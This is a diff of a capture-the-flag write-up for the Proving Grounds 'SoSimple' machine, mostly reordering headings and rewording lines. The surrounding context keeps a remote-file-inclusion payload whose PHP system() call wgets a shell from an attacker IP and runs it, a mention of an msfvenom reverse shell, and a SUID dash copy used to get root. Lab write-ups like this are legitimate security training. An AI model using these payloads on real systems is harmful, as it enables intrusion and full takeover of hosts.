@@ -132,16 +132,15 @@ VULNPATH = "wp-admin/admin-post.php?swp_debug=load_options&swp_url=%s"
 system("wget http://192.168.45.217:8000/shell  -O /var/tmp/shell; chmod 755 /var/tmp/shell; chmod +x /var/tmp/shell; /var/tmp/shell");
 </pre>
 ```
-
-![img](/assets/images/CTF/Proving_Grounds/SoSimple/rfi.png)
-
-### Reverse shell using msfvenom
+### Reverse shell payload using msfvenom
 
 ![img](/assets/images/CTF/Proving_Grounds/SoSimple/rev_shell.png)
 
-Reverse shell connection obtained
+### RFI Exploitation
 
-![img](/assets/images/CTF/Proving_Grounds/SoSimple/max.png)
+![img](/assets/images/CTF/Proving_Grounds/SoSimple/rfi.png)
+
+**Reverse shell connection obtained.**
 
 ## Privilege Escalation
 
@@ -169,7 +168,7 @@ Create bash script using the location mentioned in the permissions.
 cp /bin/dash /var/tmp/dash; chmod u+s /var/tmp/dash
 ```
 
-`chmod u+s` Allows the binary to be executed with user + SUIDs permissions.
+`chmod u+s` Allows the binary to be executed as owner + SUID permissions.
 
 ### Running script as root user
 
@@ -181,7 +180,7 @@ cp /bin/dash /var/tmp/dash; chmod u+s /var/tmp/dash
 
 `dash -p` preserves effective privilege with which it was created and executed with same privilege.
 
-**Root and proof.txt obtained.**
+**Root obtained.**
 
 Thanks for reading!
 
